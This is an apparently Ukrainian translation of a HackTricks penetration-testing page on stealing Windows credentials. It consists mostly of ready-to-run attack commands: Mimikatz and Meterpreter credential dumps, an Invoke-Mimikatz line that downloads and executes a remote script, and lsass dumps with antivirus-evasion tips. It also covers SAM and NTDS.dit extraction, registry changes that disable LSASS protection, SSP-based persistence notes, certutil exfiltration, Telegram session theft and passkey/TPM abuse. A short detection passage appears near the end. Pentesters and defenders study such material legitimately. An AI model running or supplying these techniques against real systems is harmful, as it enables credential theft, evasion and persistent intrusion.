# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Дізнайтеся, що ще може робити Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Дізнайтеся про деякі способи захисту облікових даних тут.**](credentials-protections.md) **Ці способи захисту можуть завадити Mimikatz викрасти деякі облікові дані.**

## Облікові дані в Meterpreter

Використовуйте [**плагін Credentials**](https://github.com/carlospolop/MSF-Credentials), **який** я створив, щоб **шукати паролі та хеші** на комп’ютері жертви.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, Defender його не виявляє.\
За допомогою цього інструмента можна **створити dump процесу lsass**, **завантажити dump** і **локально витягти** з нього **облікові дані**.

Також можна скористатися [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявити** використання **procdump.exe для створення дампа lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому **непомітніше** передати **PID** lsass.exe як **аргумент** procdump **замість** імені lsass.exe.

### Створення дампа lsass за допомогою **comsvcs.dll**

DLL з назвою **comsvcs.dll**, розташована в `C:\Windows\System32`, відповідає за **створення дампа пам’яті процесу** у разі збою. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, яку призначено для виклику за допомогою `rundll32.exe`.\
Перші два аргументи використовувати не потрібно, але третій складається з трьох частин. Перша частина — це ID процесу, для якого створюється дамп, друга — шлях до файлу дампа, а третя — виключно слово **full**. Альтернативних варіантів немає.\
Після обробки цих трьох частин DLL створює файл дампа й записує в нього пам’ять зазначеного процесу.\
**comsvcs.dll** можна використовувати для створення дампа процесу lsass, тож завантажувати й запускати procdump не потрібно. Цей метод детально описано тут: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для виконання використовується така команда:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Створення дампа lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть Task Manager
2. Натисніть More details
3. На вкладці Processes знайдіть процес "Local Security Authority Process"
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Створення дампа lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це підписаний Microsoft виконуваний файл, що входить до складу набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Уже наявний дамп аварійного завершення роботи всієї системи або його стиснена копія в доступній папці користувача можуть містити матеріали облікових даних для офлайн-аналізу. Імена файлів на кшталт `MEMORY.DMP` і `MEMORY.7z` — лише підказки для перевірки: переконайтеся в їхньому походженні та доступі до них і не припускайте, що вони містять придатні до використання або актуальні облікові дані.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Дампінг lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для створення дампів захищених процесів, який підтримує обфускацію дампу пам’яті та його передавання на віддалені робочі станції без запису на диск.

**Основні функції**:

1. Обхід захисту PPL
2. Обфускація файлів дампу пам’яті для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження дампу пам’яті за допомогою методів RAW і SMB без запису на диск (безфайловий дамп)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – дамп LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon використовує триетапний дампер під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки на цей API не спрацьовують:<sup>[[3]](#references)</sup>

1. **Завантажувач Stage 1 (`lals.exe`)** – шукає в `fdp.dll` заповнювач із 32 символів `d` у нижньому регістрі, замінює його на абсолютний шлях до `rtu.txt`, зберігає пропатчену DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливу DLL як нового постачальника підтримки безпеки (SSP).
2. **Stage 2 усередині LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований blob у пам’ять перед передаванням керування.
3. **Stage 3 — дампер** – відображене корисне навантаження повторно реалізує логіку MiniDump за допомогою **direct syscalls**, які визначаються за хешованими іменами API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціально призначений експорт `Tom` відкриває `%TEMP%\<pid>.ddt`, записує у файл стиснутий дамп LSASS і закриває дескриптор, щоб ексфільтрацію можна було виконати пізніше.

Примітки для оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одному каталозі. Stage 1 замінює жорстко заданий заповнювач абсолютним шляхом до `rtu.txt`, тому розміщення файлів у різних каталогах порушить ланцюжок.
* Реєстрація відбувається додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Можна самостійно додати це значення, щоб LSASS повторно завантажував SSP під час кожного завантаження системи.
* Файли `%TEMP%\*.ddt` містять стиснуті дампи. Розпакуйте їх локально, а потім передайте Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права адміністратора/SeTcb, щоб `AddSecurityPackageA` виконався успішно; після повернення виклику LSASS непомітно завантажує підставний SSP і виконує Stage 2.
* Видалення DLL із диска не вивантажує її з LSASS. Видаліть запис у реєстрі й перезапустіть LSASS (перезавантажте систему) або залиште його для тривалого закріплення.

## CrackMapExec

### Dump хешів SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump секретів LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Dump NTDS.dit із цільового DC

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump історії паролів NTDS.dit із цільового DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але їх **не можна просто скопіювати звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Завантажте** ці файли на свою машину Kali та **витягніть хеші** за допомогою:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Тіньова копія тома

За допомогою цієї служби можна копіювати захищені файли. Для цього потрібні права адміністратора.

#### Використання vssadmin

Двійковий файл vssadmin доступний лише у версіях Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Але те саме можна зробити з **Powershell**. Ось приклад того, **як скопіювати файл SAM** (використовується диск «C:», а файл зберігається в C:\users\Public), але цей спосіб можна використовувати для копіювання будь-якого захищеного файлу:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Нарешті, ви також можете скористатися [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копії SAM, SYSTEM і ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Облікові дані Active Directory — NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**: він містить важливі дані про об’єкти користувачів, групи та їхнє членство. Саме в ньому зберігаються **хеші паролів** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних є три основні таблиці:

- **Таблиця даних**: зберігає відомості про такі об’єкти, як користувачі та групи.
- **Таблиця зв’язків**: відстежує зв’язки, наприклад членство в групах.
- **Таблиця SD**: тут зберігаються **дескриптори безпеки** кожного об’єкта, що забезпечують безпеку та контроль доступу до збережених об’єктів.

Дослідження Christoffer Andersson на рівні бази даних докладніше описує ці таблиці та особливості їхньої поведінки в різних версіях.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для роботи з цим файлом, а сам файл використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може перебувати **в пам’яті `lsass`** (імовірно, там можна знайти нещодавно використані дані завдяки **кешуванню**, яке підвищує продуктивність).

#### Розшифрування hashes у NTDS.dit

Hash шифрується тричі:

1. Розшифруйте ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифруйте **hash** за допомогою **PEK** і **RC4**.
3. Розшифруйте **hash** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але в **NTDS.dit** він **зашифрований** за допомогою специфічного для контролера домену **BOOTKEY** із його вулика **SYSTEM**. Тому для отримання облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Окрема [техніка перенаправлення таблиці дескрипторів ядра](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) дає змогу скопіювати вже відкритий файловий об’єкт NTDS без VSS, але для цього потрібен довільний примітив читання/запису в ядрі контролера домену.<sup>[[16]](#references)</sup>

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно починаючи з Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Також можна скористатися трюком із [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, скористайтеся трюком [**дампу з реєстру або volume shadow copy**](#stealing-sam-and-system)).

### **Вилучення хешів із NTDS.dit**

Отримавши файли **NTDS.dit** і **SYSTEM**, можна скористатися такими інструментами, як _secretsdump.py_, щоб **вилучити хеші**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Їх також можна **автоматично вилучити** за допомогою дійсного облікового запису адміністратора домену:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Для **великих файлів NTDS.dit** рекомендується виконувати витягування за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, також можна скористатися **модулем metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витягування об’єктів домену з NTDS.dit до бази даних SQLite**

Об’єкти NTDS можна витягнути до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Витягуються не лише секрети, а й усі об’єкти та їхні атрибути, що дає змогу отримати додаткову інформацію, якщо raw-файл NTDS.dit уже отримано.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

The `SYSTEM` hive є необов’язковим, але дає змогу розшифровувати секрети (NT- і LM-хеші, додаткові облікові дані, як-от паролі у відкритому вигляді, ключі Kerberos або довірчих відносин, історію паролів NT і LM). Серед іншої інформації витягуються такі дані: облікові записи користувачів і комп’ютерів із їхніми хешами, прапорці UAC, мітки часу останнього входу та зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево організаційних підрозділів і членство в них, довірені домени з типом, напрямком і атрибутами довірчих відносин...

## Lazagne

Завантажте бінарний файл [тут](https://github.com/AlessandroZ/LaZagne/releases). За допомогою цього бінарного файлу можна витягувати облікові дані з різних програм.

```
lazagne.exe all
```

## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам’яті. Завантажте його звідси: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Витягніть облікові дані з файлу SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Завантажте його звідси: [http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть**, щоб отримати паролі.

## Збір даних з неактивних RDP-сеансів і послаблення засобів безпеки

FinalDraft RAT від Ink Dragon містить tasker `DumpRDPHistory`, методи якого стануть у пригоді будь-якому red-teamer:<sup>[[3]](#references)</sup>

### Збір телеметрії в стилі DumpRDPHistory

* **Вихідні цілі RDP** — розберіть кожен профіль користувача за шляхом `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підрозділ містить назву сервера, `UsernameHint` і час останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Свідчення вхідного RDP-підключення** – перевірте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` на наявність подій з ID **21** (успішний вхід) і **25** (відключення), щоб визначити, хто адміністрував машину:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Щойно з’ясуєте, який Domain Admin регулярно підключається, злийте LSASS (за допомогою LalsDumper/Mimikatz), поки його **відключений** сеанс ще існує. Резервний перехід CredSSP на NTLM залишає його verifier і токени в LSASS, які потім можна повторно використати через SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на контролерах домену.

### Пониження захисту реєстру, націлені на FinalDraft

Той самий імплант також змінює кілька ключів реєстру, щоб спростити викрадення облікових даних:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` вимикає Restricted Admin для вхідних RDP-підключень; це **не** вмикає pass-the-hash у цьому режимі. Значення `0` дозволяє Restricted Admin на цільовій системі, але клієнт має запросити `/RestrictedAdmin` або використовувати політику, що вимагає Restricted Admin.<sup>[[14]](#references)</sup> Самого хешу недостатньо, щоб отримати права віддаленого адміністратора; див. [передумови автентифікації RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, завдяки чому локальні адміністратори отримують необмежені токени під час мережевих підключень.
* `DSRMAdminLogonBehavior=2` дозволяє адміністратору DSRM входити в систему, коли DC онлайн, надаючи зловмисникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` знімає захист LSASS PPL, спрощуючи доступ до пам’яті для засобів дампу, таких як LalsDumper.

## Облікові дані конфігурації hMailServer (після компрометації)

Перевірте точні файли конфігурації `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` і `C:\ProgramData\hMailServer\hMailServer.ini` відповідно до розташування інсталяції. Непорожнє значення `[Security] AdministratorPassword=`, доступне для читання, є хешем пароля адміністратора hMailServer; воно не свідчить про те, що це пароль адміністратора Windows. Якщо цей обліковий секрет буде отримано, перехід до облікового запису Windows потребує незалежно підтвердженого повторного використання пароля та наявності прав на вхід.

В інсталяціях, що використовують базу даних SQL CE, окреме значення `[Database] Password=` у INI захищає базу даних. У застарілих інсталяціях це значення зашифроване Blowfish із використанням статичного ключа `THIS_KEY_IS_NOT_SECRET` і перестановки порядку байтів у 4-байтових словах. Використайте шістнадцятковий рядок із INI разом із цим фрагментом Python:<sup>[[2]](#references)</sup>

Спершу переконайтеся, що поточний обліковий запис може читати **і** INI, **і** відповідну базу даних SQL CE `.sdf`. Пароль із INI захищає базу даних; він відрізняється від хешів паролів облікових записів поштових скриньок, що зберігаються всередині неї. Переглядайте або оновлюйте **копію** бази даних, що використовується, а не робочий файл.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

З паролем у відкритому вигляді скопіюйте базу даних SQL CE, щоб уникнути блокування файлу, завантажте 32-бітний провайдер і, за потреби, оновіть її перед запитом хешів:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Колонка `accountpassword` використовує формат хешу hMailServer (режим hashcat `1421`). Зламаний пароль поштової скриньки стає точкою для pivot до користувача Windows лише тоді, коли цей пароль повторно використовується локальним або доменним обліковим записом і цей обліковий запис має необхідні права на віддалений вхід.

## Перехоплення callback-функції входу LSA (LsaApLogonUserEx2)

Деякі інструменти перехоплюють **паролі для входу у відкритому вигляді**, перехоплюючи callback-функцію входу LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб перехопити або обгорнути callback-функцію пакета автентифікації, аби збирати облікові дані **під час входу** (до хешування), а потім записувати їх на диск або повертати оператору. Зазвичай це реалізовано як допоміжний засіб, який впроваджується в LSA або реєструється в ньому, а потім фіксує кожну успішну подію інтерактивного чи мережевого входу разом з іменем користувача, доменом і паролем.<sup>[[1]](#references)</sup>

Операційні примітки:
- Для завантаження допоміжного засобу в шлях автентифікації потрібні права локального адміністратора або SYSTEM.
- Перехоплені облікові дані з’являються лише під час входу (інтерактивного, через RDP, службового або мережевого — залежно від перехоплення).

## Збережені облікові дані підключення SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає дані про збережені підключення у файлі `sqlstudio.bin` для кожного користувача. Спеціалізовані засоби для дампу можуть розбирати цей файл і відновлювати збережені облікові дані SQL. У оболонках, які повертають лише вивід команд, файл часто викрадають, кодувавши його в Base64 і виводячи в stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

На стороні оператора перебудуйте файл і запустіть dumper локально, щоб відновити облікові дані:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Крадіжка сесії браузера та cookie через Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Крадіжка сесії Telegram Desktop `tdata`

Telegram Desktop зберігає дані авторизації та стан облікового запису в каталозі **`tdata`**. Скопійовану сесію можна завантажити сумісними інструментами для автентифікації без пароля облікового запису, доки ця авторизація залишається дійсною; якщо ввімкнено шифрування локальних даних, стілу також потрібен код-пароль. Після автентифікації сесія може розкрити дані про особу, метадані діалогів і членства, повідомлення та медіафайли для завантаження.<sup>[[10]](#references)</sup>

### Виявлення та отримання

Шукайте як інсталяційні, так і портативні розташування; назви пакетів Microsoft Store можуть відрізнятися, тому перераховуйте каталоги пакетів, що містять `TelegramMessenge`, та перевіряйте їхнє піддерево `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Якщо звичайне читання не вдається, а токен процесу **вже містить і активує** `SeBackupPrivilege`, доступ із підтримкою резервного копіювання може бути запасним варіантом; він не надає привілей і не підвищує рівень привілеїв процесу. `CreateFileW` із `FILE_FLAG_BACKUP_SEMANTICS` може запитувати семантику резервного копіювання/відновлення та обходити перевірки безпеки файлів, якщо в токені наявні потрібні привілеї, але сам прапорець не обходить несумісне блокування спільного доступу.<sup>[[10]](#references)[[11]](#references)</sup>

Для файлів, заблокованих під час роботи системи, створіть/прочитайте **Volume Shadow Copy**; для файлів, доступ до яких блокує ACL, `robocopy /B` використовує режим резервного копіювання та обходить ACL файлів і каталогів.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Імплант, що враховує обмеження пропускної здатності, може спочатку надіслати лише перелік шляхів до файлів, отримати ідентифікатор знімка та шляхи, які вже збережені на C2, а потім завантажити лише відсутні файли. Тому невеликі інкрементальні передавання після рекурсивного переліку `tdata` все одно можуть свідчити про успішне викрадення сеансу.<sup>[[10]](#references)</sup>

### Виявлення та стримування

Корелюйте рекурсивний доступ до `tdata` з боку процесу, не пов’язаного з Telegram, із наданням `SeBackupPrivilege`, відкриттям файлів із backup semantics, активністю VSS або дочірнім процесом `robocopy.exe`, що використовує `/B`. Також шукайте швидкий перелік вмісту обох каталогів — `%APPDATA%` і `%LOCALAPPDATA%\Packages` — за яким ідуть вихідні з’єднання від того самого процесу. Після компрометації перейдіть у **Налаштування → Пристрої** (або **Конфіденційність і безпека → Активні сеанси**), щоб завершити невідомі сеанси; саме лише ввімкнення двоетапної перевірки не відкликає вже викрадену авторизацію.<sup>[[10]](#references)[[13]](#references)</sup>

## Викрадення облікових даних passkeys / WebAuthn із Chrome у Windows

Якщо вдалося отримати виконання коду від імені **користувача-жертви** на хості Windows, де використовуються **Chrome + синхронізовані passkeys у Google Password Manager**, passkeys стають цікавою ціллю на етапі post-exploitation навіть **без прав адміністратора/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** зберігає protobuf-кодовані записи **`WebauthnCredentialSpecifics`**. Процес того самого користувача може перерахувати **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифрований матеріал приватного ключа для синхронізованих ключів доступу.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає локальний стан реєстрації пристрою, наприклад **`wrapped_identity_private_key`** і обгорнутий секрет, який використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидкий тріаж:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-прив’язаними key blob усе ще можна зловживати як локальним оракулом підписування

Якщо браузер експортує ключ ідентифікації, захищений TPM, у вигляді **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у стані, доступному користувачу, malware **не потрібно** добувати сирий приватний ключ. Воно може просто повторно імпортувати blob на **тому самому комп’ютері** й попросити локальний TPM підписати дані, контрольовані зловмисником:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Це означає, що **прив’язка до апаратного забезпечення запобігає експорту за межі пристрою, але не використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Перелічіть `WebauthnCredentialSpecifics` у Chrome LevelDB.
   - Почніть вхід за допомогою passkey та отримайте новий WebAuthn challenge.
   - Використайте викрадений blob `wrapped_identity_private_key` на TPM жертви, щоб підписати прив’язку запиту cloud-authenticator.
   - Передайте отриманий assertion relying party.
   - Це особливо цінно, якщо RP приймає `userVerification=preferred` або не відхиляє assertion із **`UV=0`**.
2. **Перехоплення ключа з очікуванням UV**<sup>[[4]](#references)</sup>
   - Примусово запустіть повторне налаштування, видаливши `passkey_enclave_state` або надіславши коректну підписану операцію `device/forget`.
   - Якщо після налаштування пристрій залишається у стані **`uv_key_pending`**, зареєструйте контрольований зловмисником відкритий UV-ключ.
   - Якщо постачальник не перевіряє атестацію / походження нового UV-ключа із захищеного апаратного забезпечення, підписи цим ключем згодом трактуватимуться як **`UV=1`**.
3. **Викрадення master secret / відновлення SDS**<sup>[[4]](#references)</sup>
   - Примусово запустіть відновлення або повторне приєднання, щоб Chrome отримав master secret синхронізованих passkey.
